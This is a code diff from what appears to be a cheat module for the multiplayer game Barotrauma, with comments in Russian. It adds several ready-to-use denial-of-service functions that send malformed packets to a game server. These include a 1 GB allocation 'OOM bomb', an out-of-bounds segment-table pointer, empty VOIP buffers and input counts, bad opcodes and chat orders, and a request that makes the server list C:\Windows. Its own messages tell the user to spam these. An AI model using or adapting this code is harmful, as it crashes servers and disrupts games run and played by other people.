+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
+            msg.WriteBoolean(true);
+            msg.WritePadBits();
+            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
             {
-                IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
-                msg.WriteBoolean(true);           // midroundSyncingDone
+                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                 msg.WritePadBits();
-                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
-                {
-                    segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
-                    msg.WriteUInt16(1);           // networkUpdateID
-                    msg.WriteByte(255);           // inputCount=255, данных НЕТ
-                }
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                return "Input-bomb отправлена (чтение 255 инпутов за краем пакета)";
+                msg.WriteUInt16(0);                    // firstEventID (подберётся ретраями)
+                msg.WriteByte(1);                      // eventCount
+                msg.WriteUInt16(myId);                 // entityID = мой персонаж (IClientSerializable)
+                msg.WriteVariableUInt32(0x40000000u);  // msgLength = 1 ГБ!
+                msg.WriteUInt16(0);                    // characterStateID
+                // данных нет — сервер сделает new byte[1ГБ] ДО проверки буфера
             }
-            catch (Exception e)
-            {
-                return "send fail: " + e.Message;
-            }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "OOM-бомба ушла (попытка new byte[1ГБ] на сервере). Спамить для давления на GC.";
         }
 
         // ========================================================
-        //  6) VOIP обрезанный пакет DoS (волна 28/451)
+        //  [DOS] SegmentTable corrupt pointer (27/595)
         // ========================================================
-        private static string ExecVoipDoS()
+        private static string ExecSegmentTable()
         {
-            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
-            try
-            {
-                byte mySession = 0;
-                try { mySession = GameMain.Client.SessionId; } catch { }
+            if (!CanSend()) { return "нет подключения"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
+            msg.WriteInt32(int.MaxValue);              // tablePointer = 2ГБ вперёд
+            msg.WriteUInt16(0);
+            msg.WriteUInt16(0);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "SegmentTable-бомба ушла (чтение таблицы за пределами буфера)";
+        }
 
-                IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.VOICE);
-                msg.WriteByte(mySession);
-                for (int i = 0; i < 8; i++) { msg.WriteByte(255); }   // 8 буферов по 255 байт...
-                // ...данных нет → BlockCopy за краем → throw
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
-                return "VOIP-bomb отправлена (8×255 байт заявлено, 0 байт данных)";
-            }
-            catch (Exception e)
+        // ========================================================
+        //  [DOS] CircuitBox bad opcode (26)
+        // ========================================================
+        private static string ExecCircuitBox()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
+            INetSerializableStruct header = new NetCircuitBoxHeader((CircuitBoxOpcode)2, 1, 0);
+            header.Write(msg);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "CircuitBox opcode-бомба ушла";
+        }
+
+        // ========================================================
+        //  [DOS] Chat unknown order (30)
+        // ========================================================
+        private static string ExecChatOrder()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
+            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
             {
-                return "send fail: " + e.Message;
+                segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
+                msg.WriteUInt16(1);
+                msg.WriteRangedInteger((int)ChatMessageType.Order, 0, 12);
+                msg.WriteRangedInteger((int)ChatMode.None, 0, 2);
+                msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
+                msg.WriteUInt16(0);
+                msg.WriteUInt16(0);
+                msg.WriteByte(0);
             }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "ORDER-бомба ушла (работает из лобби!)";
+        }
+
+        // ========================================================
+        //  [DOS] CharacterInput count=255 (35)
+        // ========================================================
+        private static string ExecCharInput()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!GameMain.Client.GameStarted || Character.Controlled == null)
+            { return "нужно быть в раунде с персонажем"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
+            msg.WriteBoolean(true);
+            msg.WritePadBits();
+            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
+            {
+                segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
+                msg.WriteUInt16(1);
+                msg.WriteByte(255);                    // 255 инпутов, данных нет
+            }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "Input-бомба ушла";
+        }
+
+        // ========================================================
+        //  [DOS] VOIP empty buffers (28/451)
+        // ========================================================
+        private static string ExecVoip()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            byte mySession = 0;
+            try { mySession = GameMain.Client.SessionId; } catch { }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.VOICE);
+            msg.WriteByte(mySession);
+            for (int i = 0; i < 8; i++) { msg.WriteByte(255); }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
+            return "VOIP-бомба ушла";
+        }
+
+        // ========================================================
+        //  [DOS] REQUEST_BACKUP_INDICES filesystem scan (26/595)
+        // ========================================================
+        private static string ExecBackupScan()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
+            msg.WriteString("C:\\Windows");           // сервер листает каталог
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "Скан ФС отправлен (сервер листает C:\\Windows). Спамить = IO-нагрузка. Ответ = метаданные тебе.";
         }
 
         private static void CloseWindow()
@@ -496,8 +548,6 @@ namespace CSHUB.Modules
             _window = null;
             _list = null;
             _desc = null;
-            _execBtn = null;
-            _selected = -1;
         }
 
         public override void Dispose()
